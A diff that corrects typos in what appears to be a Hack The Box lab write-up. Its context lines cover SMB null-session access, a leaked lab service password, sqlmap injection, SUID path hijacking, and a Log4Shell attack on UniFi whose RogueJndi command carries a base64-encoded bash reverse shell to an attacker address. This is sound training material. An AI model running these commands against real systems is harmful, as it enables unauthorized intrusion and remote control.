@@ -79,7 +79,7 @@ smbclient -N -L 10.129.91.127
 ```
 
 *command tags:*
-- `-N | --no-pass`: supresses the normal password prompt from the client to the user.
+- `-N | --no-pass`: suppresses the normal password prompt from the client to the user.
 - `-L | --list`: list available services on the server
 
 We can connect to the `backups` service without a password via: 
@@ -102,7 +102,7 @@ The only file housed here is `prod.dtsConfig`.
 </DTSConfiguration>  
 ```
 
-Noteably, this file leaks us 
+Notably, this file leaks us 
 
 ```txt
 Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;
@@ -137,7 +137,7 @@ RECONFIGURE; — priv
 And we have command execution:
 ![shell](images/shell.png#center)
 
-Then I tried several one-liner reverse shells for powershell, but didn't have anyluck. So, I reverted back to the `netcat` binary ([nc64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe)) to spin up a reverse shell.
+Then I tried several one-liner reverse shells for powershell, but didn't have any luck. So, I reverted back to the `netcat` binary ([nc64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe)) to spin up a reverse shell.
 
 To host this file to the box: 
 ```sh
@@ -318,7 +318,7 @@ Now to find where this file was uploaded, and how to run it. `/uploads` seems li
 
 ![php-rs](images/php-rs.png#center)
 
-Flag is found in `/home/rober/user.txt`
+Flag is found in `/home/robert/user.txt`
 
 *file: user.txt*
 ```txt {linenos=true}
@@ -377,7 +377,7 @@ Since `system("cat...")` is being run, we can simply update the `$path` environm
 - What is the access ID of the admin user? `34322`
 - On uploading a file, what directory does that file appear in on the server? `/uploads`
 - What is the file that contains the password that is shared with the robert user? `db.php`
-- What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group? `find`
+- What executable is run with the option "-group bugtracker" to identify all files owned by the bugtracker group? `find`
 - Regardless of which user starts running the bugtracker executable, what's user privileges will use to run? `root`
 - What SUID stands for? `Set owner user id`
 - What is the name of the executable being called in an insecure manner? `cat`
@@ -464,7 +464,7 @@ Now lets try the credentials we found `admin:qwerty789`
 
 ![qwerty](images/qwerty.png#center)
 
-After looking around, the only thing that seemed potentially vulnerable on the webpage was the `search` feature. This could be injectible via `sqlmap`. I first threw the website into `burpsuite`, copied the `GET` request of the search, and then saved this to a file called `get.request`.
+After looking around, the only thing that seemed potentially vulnerable on the webpage was the `search` feature. This could be injectable via `sqlmap`. I first threw the website into `burpsuite`, copied the `GET` request of the search, and then saved this to a file called `get.request`.
 
 ```sh
 sqlmap -r get.request -p search
@@ -618,7 +618,7 @@ Going to `10.129.186.136:8080` redirects us to `10.129.186.136:8443` and shows a
 
 ![unifi](images/unifi.png#center)
 
-After a quick search, I found that `Unifi 6.4.54` is vulnerable to [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) in an in-depth [post walkthrough](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi). I simply followed this walkthrough to get a reverse shell!
+After a quick search, I found that `Unifi 6.4.54` is vulnerable to [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) in an in-depth [post walk-through](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi). I simply followed this walk-through to get a reverse shell!
 
 **log4j (via HTB Writeup)**
 
@@ -628,7 +628,7 @@ applications locate resources and other program objects. A resource is a program
 `LDAP` (Lightweight Directory Access Protocol) is an open, vendor-neutral,
 industry standard application protocol for accessing and maintaining distributed directory information services over the Internet or a Network. The default port that LDAP runs on is port 389."
 
-***Important note:*** you must remove the spaces from the command listed in the [above writeup](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi) in order to succesfully get a reverse shell:
+***Important note:*** you must remove the spaces from the command listed in the [above writeup](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi) in order to successfully get a reverse shell:
 
 ```sh
 java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMjUvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.14.25"
@@ -668,7 +668,7 @@ mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0
 ![admin](images/admin.png#center)
 Bingo! `administrator:unified` got us in!
 
-And undersettings there's some valuable information!
+And under settings there's some valuable information!
 
 ![yes](images/yes.png#center)
 
